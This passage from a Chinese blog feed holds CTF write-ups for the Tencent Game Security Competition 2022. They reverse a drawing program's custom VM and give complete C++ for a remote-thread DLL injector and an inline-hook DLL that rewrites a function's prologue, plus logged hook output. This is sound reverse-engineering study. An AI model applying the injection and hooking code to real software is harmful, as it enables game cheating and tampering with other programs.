class="line">                    <span class="keyword">while</span> ( v15 );</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0x89657EAD</span>:</span><br><span class="line">                Stack[<span class="number">0</span>] += Stack[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0x8E7CADF2</span>:</span><br><span class="line">                RIP_S += <span class="number">2</span>;</span><br><span class="line">                Stack[code[RIP_S + <span class="number">272</span>]] = Stack[code[v10 + <span class="number">273</span>]];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0x9645AAED</span>:</span><br><span class="line">                <span class="keyword">if</span> ( code[<span class="number">272</span>] == <span class="number">0xEE69624A</span> &amp;&amp; code[<span class="number">273</span>] == <span class="number">0x689EDC0A</span> &amp;&amp; code[<span class="number">274</span>] == <span class="number">0x98EFDBC9</span> )</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;call Paint(%d, %d, %d, %d, NAN, a3, a4, a5, a6, a7)&quot;</span>,Stack[<span class="number">4</span>], Stack[<span class="number">5</span>], Stack[<span class="number">6</span>], Stack[<span class="number">7</span>]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0x9645AEDC</span>:</span><br><span class="line">                RIP_S = <span class="number">0x671</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="number">0x671</span>;</span><br><span class="line">    ++RIP_S;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( RIP_S &lt; <span class="number">0x671</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对比起来这个虚拟机的流程也是更大更难去分析了，但是根据已有的资料看来，似乎出的问题与初赛一致，最好的办法就是做 hook 然后替换坐标。据说决赛是卷方法数，当然其他的方法也可以有，这里可以说一些理论可行的方案：</p><ul><li>自己生成正确的指令流，直接PATCH SYS 文件。</li><li>等代码注入完成之后，搜索指令的特征码找到三环程序中代码的位置，替换（感觉和上面算一种）。</li><li>hook 绘制的代码，写入正确坐标。</li><li>不用虚拟机，自己接管流程，然后自己计算正确的坐标和加密的参数调用绘制函数。</li><li>不知道它代码坐标计算出错的原因，如果是逻辑错误可以直接修虚拟机，也能算一种。</li></ul><p>脑子有限，只能想那么多了，希望有时间那个旧电脑退役了刷个系统再去实现这些操作把。</p>]]></content>
    
    
    <summary type="html">今天试试复盘这个决赛</summary>
    
    
    
    <category term="ctf" scheme="https://xia0ji233.github.io/categories/ctf/"/>
    
    <category term="reverse" scheme="https://xia0ji233.github.io/categories/ctf/reverse/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/Windows/"/>
    
    <category term="GameSec" scheme="https://xia0ji233.github.io/categories/Windows/GameSec/"/>
    
    
  </entry>
  
  <entry>
    <title>腾讯游戏安全大赛2022初赛题解</title>
    <link href="https://xia0ji233.github.io/2024/03/19/tencent-race-2022-pre/"/>
    <id>https://xia0ji233.github.io/2024/03/19/tencent-race-2022-pre/</id>
    <published>2024-03-19T15:00:00.000Z</published>
    <updated>2024-04-09T05:23:09.910Z</updated>
    
    <content type="html"><![CDATA[<p>复盘一下2022的腾讯游戏安全比赛。</p><h2 id="初赛"><a href="#初赛" class="headerlink" title="初赛"></a>初赛</h2><h3 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h3><p>这里有一个画了flag的小程序，可好像出了点问题，flag丢失了，需要把它找回来。</p><p>题目</p><img src="/2024/03/19/tencent-race-2022-pre/1.png" class=""><p>找回flag样例：</p><img src="/2024/03/19/tencent-race-2022-pre/2.png" class=""><p><strong>要求：</strong></p><ol><li>不得直接patch系统组件实现绘制（如：直接编写D3D代码绘制flag），只能对题目自身代码进行修改或调用。</li><li>找回的flag需要和预期图案（包括颜色）一致，如果绘制结果存在偏差会扣除一定分数。</li><li>赛后需要提交找回flag的<strong>截图</strong>和<strong>解题代码或文档</strong>进行评分。</li></ol><p><strong>评分标准：</strong></p><p>根据提交截图和代码文档的时间作为评分依据。</p><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>先打开所给的程序，发现输出 ACE 的 LOGO 过一会后会消失。</p><p>IDA，打开找到 WinMain 函数，找到消息循环函数，分析主体逻辑</p><img src="/2024/03/19/tencent-race-2022-pre/3.png" class=""><p>看到主体的函数</p><img src="/2024/03/19/tencent-race-2022-pre/4.png" class=""><p>有一个初始化的操作，会分配一片可读可写可执行（<code>#define PAGE_EXECUTE_READWRITE  0x40</code>）内存并将代码拷贝过去，主要有 <code>140005040</code> 和 <code>140006350</code> 两个地址的代码。</p><img src="/2024/03/19/tencent-race-2022-pre/5.png" class=""><p>第一段拷贝完成之后可以发现它 PATCH 了函数开头的几个字节，应该是防静态分析的，而且看字节大概是 <code>PUSH,POP</code> 指令。</p><p>下面可以看到记录了当前的时刻，如果发现起始时刻与当前时刻超过了 4000（4000MS）那么执行下面的指令，这里根据开始的运行大概能猜测出来应该就是停止绘制的代码了。</p><img src="/2024/03/19/tencent-race-2022-pre/6.png" class=""><p>最后调用 <code>shellcode+0x650</code> 的代码作为入口，下面可以尝试跟一下这个函数，这里可以采用静态修改代码为真实代码，也可以动调执行到这里的时候反编译。</p><p>直接跟到入口，可以很明显地发现函数入口往后有一段对自身的调用</p><img src="/2024/03/19/tencent-race-2022-pre/7.png" class=""><p>看地址是 <code>shellcode+0x420</code>，跟过去，重建函数，是一个很标准的虚拟机流程</p><img src="/2024/03/19/tencent-race-2022-pre/8.png" class=""><p>虚拟机的代码存在于 <code>shellcode+0x1301</code> 的地址，也就是第二次拷贝得到的代码。</p><p>根据自己的理解还原了一下虚拟机的流程：</p><img src="/2024/03/19/tencent-race-2022-pre/9.png" class=""><ul><li>op0：Stack[0]+&#x3D;Stack[1]</li><li>op1：Stack[0]-&#x3D;Stack[1]</li><li>op2 num1,num2：Stack[num2]&#x3D;Stack[num1]</li><li>op3 num1,num2：Stack[num2]&#x3D;num1</li><li>op4 num：这里的操作很神奇，会把栈中第一个值赋值为 <code>num^&#39;ACE&#39;</code>，第二个值赋值为一个很复杂的运算。</li><li>op5：调用 shellcode 头部的函数。</li><li>op6：调用 shellcode 头部的函数，与上一个唯一的区别是第五个参数。</li><li>op7：退出</li></ul><p>而这里的 v16-v18 大概率也是 op2 和 op3 会操作到的，也算栈中的值。</p><p>这里很容易猜测 op5 和 op6 应该是绘制函数的代码。</p><p>FFFF00 刚好是黄色的代码，将取色器放置在程序上也能发现蓝色的代码是 2DDBE7，和这里的颜色代码差了一点，但是可以尝试修改一下。</p><p>CE 找到这个位置，将代码修改一下</p><img src="/2024/03/19/tencent-race-2022-pre/10.png" class=""><p>这里我直接把它改成 000000 也就是黑色，直接跳出来。</p><p>然后执行完下面的代码，发现输出变成黑色了</p><img src="/2024/03/19/tencent-race-2022-pre/11.png" class=""><p>那么主要肯定是要分析 <code>shellcode+0</code> 处的函数代码了（看不懂直接放弃）。</p><p>虽然看不懂，但是已经知道里面传的一个值是颜色了，去分析分析其他参数的含义就可以了。这里最好的一个办法应该是 hook，去打印它的参数，为了方便可以把它限时输出这点 PATCH 了。</p><p>这个直接去找到它的跳转让它永远跳转或者永远不跳转就行了，这里是改成永远跳转，90 加前面，偏移可以不用动。</p><img src="/2024/03/19/tencent-race-2022-pre/12.png" class=""><p>写一个 DLL 去做 HOOK，主要去 HOOK shellcode，这个地址通过全局变量可以获得（2022游戏安全技术竞赛初赛.exe+0x8308）。</p><p>64 位的程序hook一般直接用 <code>inline</code> 或者 <code>hotfix</code> 或者无痕，个人感觉 <code>hotfix</code> 实现起来简单，但是个人更喜欢 <code>inline hook</code>，因为它 <code>windows</code> 消息的机制，会不停地打印数据，因此加全局变量限制输出前 100 次调用的结果。</p><p>注入器（基本通用的）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXEFILEW <span class="string">L&quot;2022游戏安全技术竞赛初赛.exe&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXEFILE <span class="string">&quot;2022游戏安全技术竞赛初赛.exe&quot;</span></span></span><br><span class="line">DWORD old;</span><br><span class="line">SIZE_T written;</span><br><span class="line"><span class="function">DWORD <span class="title">FindProcess</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    HANDLE hSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    PROCESSENTRY32 pe32;</span><br><span class="line">    pe32 = &#123; <span class="built_in">sizeof</span>(pe32) &#125;;</span><br><span class="line">    BOOL ret = <span class="built_in">Process32First</span>(hSnap, &amp;pe32);</span><br><span class="line">    <span class="keyword">while</span> (ret)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">wcsncmp</span>(pe<span class="number">32.</span>szExeFile,  EXEFILEW, <span class="built_in">lstrlen</span>(EXEFILEW))) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;找到程序 %s ,PID=%d\n&quot;</span>, EXEFILE, pe<span class="number">32.</span>th32ProcessID);</span><br><span class="line">            <span class="keyword">return</span> pe<span class="number">32.</span>th32ProcessID;</span><br><span class="line">        &#125;</span><br><span class="line">        ret = <span class="built_in">Process32Next</span>(hSnap, &amp;pe32);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InjectModule</span><span class="params">(DWORD ProcessId, <span class="type">const</span> <span class="type">char</span>* szPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, ProcessId);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;进程句柄:%p\n&quot;</span>, hProcess);</span><br><span class="line">    LPVOID lpAddress = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0x100</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">    SIZE_T dwWriteLength = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(hProcess, lpAddress, szPath, <span class="built_in">strlen</span>(szPath), &amp;dwWriteLength);</span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)LoadLibraryA, lpAddress, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, lpAddress, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DWORD ProcessId = <span class="built_in">FindProcess</span>();</span><br><span class="line">    <span class="keyword">while</span> (!ProcessId) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;未找到%s程序，等待两秒中再试\n&quot;</span>,EXEFILE);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">2000</span>);</span><br><span class="line">        ProcessId = <span class="built_in">FindProcess</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">InjectModule</span>(ProcessId, <span class="string">&quot;C:\\Users\\xia0ji233\\source\\repos\\T2022Pre\\x64\\Debug\\hack.dll&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用于 HOOK 的 DLL：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> __int64 (*Func)(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4, <span class="type">int</span> a5, __int64 a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10);</span><br><span class="line"><span class="function">__int64 <span class="title">GetBaseAddr</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    HMODULE hMode = <span class="built_in">GetModuleHandle</span>(<span class="literal">nullptr</span>);</span><br><span class="line">    <span class="keyword">return</span> (__int64)hMode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span>* shellcode = <span class="number">0</span>;</span><br><span class="line">BYTE HookCode[] = &#123;</span><br><span class="line">    <span class="number">0x48</span>,<span class="number">0xB8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,  <span class="comment">//mov rax,xxx</span></span><br><span class="line">    <span class="number">0xFF</span>,<span class="number">0xE0</span>                                           <span class="comment">//jmp rax </span></span><br><span class="line">&#125;;</span><br><span class="line">BYTE OriginCode[<span class="number">0x50</span>];</span><br><span class="line"><span class="type">size_t</span> HookLen = <span class="number">12</span>;</span><br><span class="line">__int64 times = <span class="number">100</span>;</span><br><span class="line"><span class="function">__int64 <span class="title">HackShellcode</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4, <span class="type">int</span> a5, __int64 a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(shellcode, OriginCode,HookLen);              <span class="comment">//unhook</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="type">int</span> x = a1, y = a2;</span><br><span class="line">    __int64 ret=(*(Func)shellcode)(x, y, a3, a4, <span class="number">0xFFFF0000</span>, a6, a7, a8, a9, a10);</span><br><span class="line">    times--;</span><br><span class="line">    <span class="keyword">if</span> (times&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;call shellcode(%d,%d,%d,%d,%d,%p,%p,%p,%p,%p)\n&quot;</span>,x, y, a3, a4, a5, a6, a7, a8, a9, a10);          </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(shellcode, HookCode, HookLen);               <span class="comment">//rehook</span></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HookShellcode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __int64 base = <span class="built_in">GetBaseAddr</span>();</span><br><span class="line">    __int64 Ptr = base + <span class="number">0x8308</span>;</span><br><span class="line"></span><br><span class="line">    shellcode = (<span class="type">void</span>*)(*(__int64*)Ptr);</span><br><span class="line">    <span class="keyword">while</span> (!shellcode) &#123;</span><br><span class="line">        shellcode = (<span class="type">void</span>*)(*(__int64*)Ptr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Find shellcode Fail\n&quot;</span>);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">200</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;shellcode addr=%p\n&quot;</span>, shellcode);</span><br><span class="line">    <span class="built_in">memcpy</span>(OriginCode, shellcode,HookLen);              <span class="comment">//saved</span></span><br><span class="line">    Func FuncPtr = HackShellcode;</span><br><span class="line">    *(__int64*)(HookCode + <span class="number">2</span>) = (__int64)FuncPtr;       <span class="comment">//construct</span></span><br><span class="line">    <span class="built_in">memcpy</span>(shellcode, HookCode, HookLen);               <span class="comment">//hook</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                      DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                      LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">            <span class="built_in">AllocConsole</span>();</span><br><span class="line">            <span class="built_in">freopen</span>(<span class="string">&quot;CONOUT$&quot;</span>, <span class="string">&quot;w&quot;</span>, stdout);</span><br><span class="line">            <span class="built_in">HookShellcode</span>();</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是为了输出方便创建一个终端定向标准输出，然后 IO 函数就能往终端打印了。</p><p>hook 其实就是覆盖函数头，劫持到自己的函数里面，打印出参数之后把钩子去掉，恢复回原来的样子，再去正常调用，调用结束之后重新挂回钩子，要实现输出前100条的话最后不要重新挂钩子就行。</p><p>结果（PS：输出是正常的，但是我强制都改成黄色绘制了）：</p><img src="/2024/03/19/tencent-race-2022-pre/13.png" class=""><p>因为前几个参数是 <code>__int32</code> 类型的，所以直接换 <code>%d</code> 打印一下，这里放一下部分的数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">shellcode addr=000001C5654B0000</span><br><span class="line">call shellcode(-950,50,-14703700,1248208,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)</span><br><span class="line">call shellcode(50,-390,1822057,-1524539,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)</span><br><span class="line">call shellcode(-950,170,-7425437,14227863,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)</span><br><span class="line">call shellcode(50,230,1897472,15215384,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)</span><br><span class="line">call shellcode(-950,-210,3743658,7267794,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)</span><br><span class="line">call shellcode(50,350,966258,14122466,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)</span><br><span class="line">call shellcode(-890,-270,463184,7666472,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)</span><br><span class="line">call shellcode(170,-270,-2474473,12856971,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)</span><br><span class="line">call shellcode(-770,230,3460907,-13492529,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)</span><br><span class="line">call shellcode(110,-390,-5989351,14280177,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)</span><br><span class="line">call shellcode(-830,170,-3514649,12856715,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)</span><br><span class="line">call shellcode(650,50,15384343,11002795,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)</span><br><span class="line">call shellcode(590,110,12856715,13307703,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)</span><br><span class="line">call shellcode(530,170,14096303,2054931,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)</span><br><span class="line">call shellcode(470,230,12869865,15314261,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)</span><br><span class="line">call shellcode(410,290,13085065,12188981,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)</span><br><span class="line">call shellcode(470,290,11235584,6581496,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)</span><br><span class="line">call shellcode(530,290,12847529,3263901,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)</span><br><span class="line">call shellcode(710,50,14122635,3090291,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)</span><br><span class="line">call shellcode(770,50,14265601,10052917,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)</span><br><span class="line">call shellcode(830,50,3793238,14305830,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)</span><br><span class="line">call shellcode(710,110,1253500,3434568,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)</span><br><span class="line">call shellcode(770,170,13177867,745383,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)</span><br></pre></td></tr></table></figure><p>可以发现，前两个参数应该是坐标（我猜的），但是出现了负值，也就是打印到了屏幕外面，而且都是黄色的点会出现这种情况，导致了 <code>FLAG</code> 打印不出来，因此尝试在 hook 层面修复这个 bug，把所有的负值翻转，但是发现并没什么用，说明bug应该不止那么简单，还得再分析分析。</p><p>首先就是想看看它一轮有多少个点，直接建个 <code>set</code> 去输出就行，把所有点保存下来。</p><p>DLL代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line">std::set&lt;std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;s;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> __int64 (*Func)(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4, <span class="type">int</span> a5, __int64 a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10);</span><br><span class="line"><span class="function">__int64 <span class="title">GetBaseAddr</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    HMODULE hMode = <span class="built_in">GetModuleHandle</span>(<span class="literal">nullptr</span>);</span><br><span class="line">    <span class="keyword">return</span> (__int64)hMode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span>* shellcode = <span class="number">0</span>;</span><br><span class="line">BYTE 